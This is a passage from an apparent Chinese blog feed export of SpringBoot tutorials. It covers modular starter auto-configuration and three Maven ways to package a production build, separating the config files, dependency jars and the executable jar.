<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在web模块中</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span></span><br><span class="line"><span class="meta">@ConditionalOnClass(CoreService.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebAutoConfiguration</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CoreService coreService;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> WebService <span class="title function_">webService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WebServiceImpl</span>(coreService);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依赖管理：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>myproject-core-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>优缺点分析<br><strong>优点：</strong></p>
<ul>
<li>功能模块化，按需引入</li>
<li>减少不必要的依赖</li>
<li>便于团队协作开发</li>
<li>符合单一职责原则</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>模块间依赖关系管理复杂</li>
<li>版本一致性维护困难</li>
<li>开发和测试工作量增加</li>
</ul>
<p>适用场景：适合大型项目或平台型应用，需要根据不同业务场景选择不同功能组合的情况。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot功能三【多种生产打包方式】</title>
    <url>/cnblogs.github.io/p/7186.html</url>
    <content><![CDATA[<h3 id="方法一-插件spring-boot-maven-plugin"><a href="#方法一-插件spring-boot-maven-plugin" class="headerlink" title="方法一 插件spring-boot-maven-plugin"></a>方法一 插件spring-boot-maven-plugin</h3><ul>
<li>项目应用的配置文件排除 统一打包到config目录下<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--filerting设置为true,则打包过程中会对这些文件进行过滤处理--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>true<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--指定目标路径为config--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">targetPath</span>&gt;</span>$&#123;project.build.directory&#125;/config<span class="tag">&lt;/<span class="name">targetPath</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--使用通配符--&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.yml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">include</span>&gt;</span>mapper/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 这里可以根据你实际想要包含的配置文件类型来添加更多的include配置 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>把我们写代码打包可执行jar，并排除依赖jar包<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--项目的启动类,如果有多个main就必须指定，没有可以缺失</span></span><br><span class="line"><span class="comment">     &lt;mainClass&gt;XXXXX.TwinWebApplication&lt;/mainClass&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--解决windows命令行窗口中文乱码--&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">jvmArguments</span>&gt;</span>-Dfile.encoding=UTF-8<span class="tag">&lt;/<span class="name">jvmArguments</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">layout</span>&gt;</span>ZIP<span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--配置需要打包进项目的jar--&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--填写需要打包所需要的依赖 。没有匹配上任何jar包机排除依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">include</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>no-exists-jar<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>non-exists-jar<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- 表示当运行mavn package打包时，使用Springboot插件打包 --&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">goal</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>配置依赖的jar包 统一打包lib目录<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--此插件用于将依赖包抽出--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-dependency-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">goal</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;project.build.directory&#125;/lib<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">excludeTransitive</span>&gt;</span>false<span class="tag">&lt;/<span class="name">excludeTransitive</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">stripVersion</span>&gt;</span>false<span class="tag">&lt;/<span class="name">stripVersion</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">includeScope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">includeScope</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="方法二-使用maven-jar-plugin插件实现"><a href="#方法二-使用maven-jar-plugin插件实现" class="headerlink" title="方法二 使用maven-jar-plugin插件实现"></a>方法二 使用maven-jar-plugin插件实现</h3><ul>
<li>使用插件maven-resources-plugin处理配置文件打包到config目录<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-resources-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">id</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">goal</span>&gt;</span>copy-resources<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--配置文件打包成config目录下 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;project.build.directory&#125;/twin-web/config<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>使用maven-jar-plugin 打包可执行jar 并排除依赖<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!--输入打包可执行的jar到twin-web\libs\下--&gt;</span></span><br><span class="line">          $&#123;project.build.directory&#125;/twin-web/</span><br><span class="line">       <span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">addMavenDescriptor</span>&gt;</span>false<span class="tag">&lt;/<span class="name">addMavenDescriptor</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">addClasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addClasspath</span>&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- 增加执行启动jar的依赖jar包目录前缀--&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">classpathPrefix</span>&gt;</span>./libs/<span class="tag">&lt;/<span class="name">classpathPrefix</span>&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- 指定启动类--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.keqing.twinweb.TwinWebApplication<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!-- 增加配置文件的classpath--&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Class-Path</span>&gt;</span>./config/<span class="tag">&lt;/<span class="name">Class-Path</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 排除配置文件--&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>*.yml<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>mapper/**<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>*.xml<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>使用maven-dependency-plugin 打包libs目录下<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-dependency-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">goal</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;project.build.directory&#125;/twin-web/libs<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">excludeTransitive</span>&gt;</span>false<span class="tag">&lt;/<span class="name">excludeTransitive</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">stripVersion</span>&gt;</span>false<span class="tag">&lt;/<span class="name">stripVersion</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">includeScope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">includeScope</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="方式三-使用maven-assembly-plugin打包"><a href="#方式三-使用maven-assembly-plugin打包" class="headerlink" title="方式三 使用maven-assembly-plugin打包"></a>方式三 使用maven-assembly-plugin打包</h3><ul>
<li>项目应用的配置文件排除<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">             <span class="comment">&lt;!--filerting设置为true,则打包过程中会对这些文件进行过滤处理--&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>true<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">             <span class="comment">&lt;!--使用通配符--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.yml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">include</span>&gt;</span>mapper/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 这里可以根据你实际想要包含的配置文件类型来添加更多的include配置 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>配置spring-boot-maven-plugin<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目的启动类,如果有多个main就必须指定，没有可以缺失</span></span><br><span class="line"><span class="comment">         &lt;mainClass&gt;XXXXX.TwinWebApplication&lt;/mainClass&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--解决windows命令行窗口中文乱码--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jvmArguments</span>&gt;</span>-Dfile.encoding=UTF-8<span class="tag">&lt;/<span class="name">jvmArguments</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">layout</span>&gt;</span>ZIP<span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">           <span class="comment">&lt;!--配置需要打包进项目的jar--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--填写需要打包所需要的依赖 。没有匹配上任何jar包机排除依赖--&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">include</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>no-exists-jar<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>non-exists-jar<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                 <span class="comment">&lt;!-- 表示当运行mavn package打包时，使用Springboot插件打包 --&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">goal</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>引入springboot里约定maven-assembly-plugin<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 打包文件名字不包含 assembly.xml 中 id --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">appendAssemblyId</span>&gt;</span>false<span class="tag">&lt;/<span class="name">appendAssemblyId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">descriptors</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--项目所在目录配置文件的 assembly.xml文件 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">descriptor</span>&gt;</span>assembly.xml<span class="tag">&lt;/<span class="name">descriptor</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">descriptors</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assembly<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>
配置assembly.xml文件<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">assembly</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 打包文件名的标识符，用来做后缀--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assembly<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 打包的类型，如果有N个，将会打N个类型的包 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">formats</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">format</span>&gt;</span>tar.gz<span class="tag">&lt;/<span class="name">format</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">format</span>&gt;</span>zip<span class="tag">&lt;/<span class="name">format</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">formats</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- 压缩包下是否生成和项目名相同的根目录 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">includeBaseDirectory</span>&gt;</span>true<span class="tag">&lt;/<span class="name">includeBaseDirectory</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- 用来设置一组文件在打包时的属性。--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">fileSets</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 0755-&gt;即用户具有读/写/执行权限，组用户和其它用户具有读写权限；--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 0644-&gt;即用户具有读写权限，组用户和其它用户具有只读权限；--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 将src/bin目录下的jar启动脚本输出到打包后的目录中 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">fileSet</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--lineEnding选项可用于控制给定的行结束文件 --&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">lineEnding</span>&gt;</span>unix<span class="tag">&lt;/<span class="name">lineEnding</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">directory</span>&gt;</span>$&#123;basedir&#125;/bin<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;file.separator&#125;<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">fileMode</span>&gt;</span>0755<span class="tag">&lt;/<span class="name">fileMode</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span>&gt;</span>**.sh<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span>&gt;</span>**.bat<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">fileSet</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 把项目的配置文件，打包进压缩文件的config目录 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">fileSet</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directory</span>&gt;</span>$&#123;basedir&#125;/src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>config<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">fileMode</span>&gt;</span>0644<span class="tag">&lt;/<span class="name">fileMode</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span 